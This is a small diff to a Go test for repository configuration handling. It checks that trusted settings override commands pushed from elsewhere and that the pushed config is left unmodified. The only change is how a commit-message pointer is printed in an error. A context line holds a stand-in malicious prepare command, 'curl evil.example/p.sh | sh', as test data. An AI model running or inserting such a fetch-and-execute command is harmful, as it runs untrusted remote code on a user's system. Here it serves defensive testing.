@@ -82,7 +82,7 @@ func TestEffectiveRepoConfig_TrustedOverridesPushedCommands(t *testing.T) {
 		t.Errorf("ignore_patterns = %v, want pushed value", got.IgnorePatterns)
 	}
 	if got.Commit.FixMessage == nil || *got.Commit.FixMessage != pushedTemplate {
-		t.Errorf("commit.fix_message = %v, want pushed value", got.Commit.FixMessage)
+		t.Errorf("commit.fix_message = %v, want pushed value", deref(got.Commit.FixMessage))
 	}
 	// The pushed config must not be mutated.
 	if pushed.Commands.Prepare != "curl evil.example/p.sh | sh" {
